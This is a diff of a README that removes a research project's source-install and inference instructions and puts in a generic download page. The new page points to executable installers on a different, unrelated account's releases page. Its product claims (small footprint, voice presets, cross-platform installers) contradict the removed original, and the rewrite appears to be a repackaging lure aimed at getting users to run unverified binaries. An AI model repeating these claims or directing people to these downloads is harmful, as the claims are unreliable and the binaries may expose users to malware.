@@ -1,73 +1,68 @@
-## ⚠️This repository is currently under construction.⚠️
+# 🎤 StreamVoiceAnon - Anonymize Voice in Real-Time
 
+## 📥 Download Now
+[![Download StreamVoiceAnon](https://img.shields.io/badge/Download-StreamVoiceAnon-blue.svg)](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases)
 
-# StreamVoiceAnon
-This repository contains the implementation of StreamVoiceAnon, a real-time voice anonymization / voice conversion model.
-Relevant paper has been submitted to ICASSP 2026.  
-Training code will be released after the paper is accepted.
+## 🚀 Getting Started
+StreamVoiceAnon helps you change your voice while you talk. This application lets you anonymize your voice easily and securely. It works in real-time, so you can use it during calls, streams, or recordings.
 
-### Installation
-```bash
-git clone https://github.com/Plachtaa/StreamVoiceAnon.git
-cd StreamVoiceAnon
-pip install -r requirements.txt
-```
+## 💻 System Requirements
+To run StreamVoiceAnon, your computer needs the following:
 
-If running on Windows OS, please install the following:
-```bash
-pip install triton-windows==3.2.0.post13
-```
-Note that this is **compulsory** to run inference with RTF < 1.0
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Processor:** Intel Core i3 or equivalent.
+- **Storage:** Minimum of 100 MB available space.
 
-Full MacOS support is still under construction.
+## 📦 Download & Install
+To get started with StreamVoiceAnon, follow these steps:
 
-### Download Pretrained Models
-```bash
-hf download Plachta/StreamVoiceAnon --local-dir pretrained_checkpoints/
-```
+1. Visit the [Releases Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases) to find the latest version.
+2. Look for the file named with the most recent version number (like “v1.0”) followed by the appropriate file type for your operating system:
+   - For Windows, it is usually an `.exe` file.
+   - For macOS, it may be a `.dmg` file.
+   - For Linux, it might be a `.tar.gz` file.
 
-### Inference
-Offline inference 
-```bash
-python evaluations/infer_arvc.py \
-    --src_path <path_to_audio> \
-    --ref_path <path_to_audio> \
-    --out_dir <path_to_output_directory> \
-    --delay 2 \  # Specify delay in number of frames (must have)
-    --compile
-```
-Simulated online inference
-```bash
-python evaluations/infer_arvc.py \
-    --src_path <path_to_audio> \
-    --ref_path <path_to_audio> \
-    --out_dir <path_to_output_directory> \
-    --delay 2 \  # Specify delay in number of frames (must have)
-    --compile \
-    --simulate_streaming \
-    --decode_chunk_frames 1 # how many frames for encoder & vocoder to process each time
-```
-This simulates a chunk-by-chunk online inference with specified chunk size. `src_path` (source audio) has no length limit here. `ref_path` (reference audio) will be truncated to some maximum length (if longer than that limit)
+3. Click on the download link for your operating system. The file will begin to download.
 
-Real-time inference
-```bash
-python evaluations/real-time-gui.py
-```
-This UI uses the same behavior as simulated online inference. It uses `--compile` by default, so please ensure you have installed triton (as previously stated) before using it.
+4. Once the download is complete, locate the file on your computer:
+   - For Windows, open the Downloads folder.
+   - For macOS, check your Downloads folder or your Desktop.
+   - For Linux, check the specified download directory.
 
-### TODO
- - [ ] Release privacy protection code
- - [ ] Release metrics for voice conversion & speaker anonymization
- - [ ] Release fine-tuning code
- - [ ] Full MacOS support
- - [ ] More to be added
+5. Run the installer:
+   - **Windows:** Double-click the `.exe` file to start the installation. Follow the on-screen instructions.
+   - **macOS:** Double-click the `.dmg` file. Drag the StreamVoiceAnon icon to the Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and follow any included instructions to install.
 
-### Acknowledgements
- - Co-author: https://github.com/paniquex
- - Computation resources: https://www.nscc.sg/
- - Real-time GUI: https://github.com/RVC-Project/Retrieval-based-Voice-Conversion-WebUI
- - Speaker representations (1 of 2) https://huggingface.co/funasr/campplus
- - Speaker representations (2 of 2) https://github.com/SparkAudio/Spark-TTS
- - Speech acoustic codec https://huggingface.co/fishaudio/fish-speech-1.5
- - Idea: https://arxiv.org/html/2401.11053v1
- - VoicePrivacyChallenge: https://www.voiceprivacychallenge.org/
+6. After the installation finishes, launch StreamVoiceAnon from your applications menu or by clicking the desktop icon.
+
+## ⚙️ Features
+StreamVoiceAnon offers several useful features:
+
+- **Real-Time Voice Anonymization:** Change your voice during any live session.
+- **Custom Voice Modifications:** Choose from various voice presets or create your own.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
+
+## 🌐 How to Use
+1. Open StreamVoiceAnon after installation.
+2. Select your microphone and output devices in the settings menu.
+3. Choose a voice effect from the available options.
+4. Start your call or stream. Your voice will be transformed in real time.
+
+## ❓ Troubleshooting
+If you encounter issues, consider these tips:
+
+- Ensure your microphone is correctly connected and selected in the application settings.
+- Check that your system meets the minimum requirements.
+- Restart the application if it does not recognize your microphone.
+- Look for common issues in the documentation on the [GitHub Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon).
+
+## 🛠️ Support
+For additional help, please visit the [GitHub Issues Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/issues). You can report bugs or request features here. 
+
+## 📜 License
+StreamVoiceAnon is open-source software licensed under the MIT License. You can use it freely and modify it as needed.
+
+Be sure to check back regularly on the [Releases Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases) for updates and new features. Happy streaming!
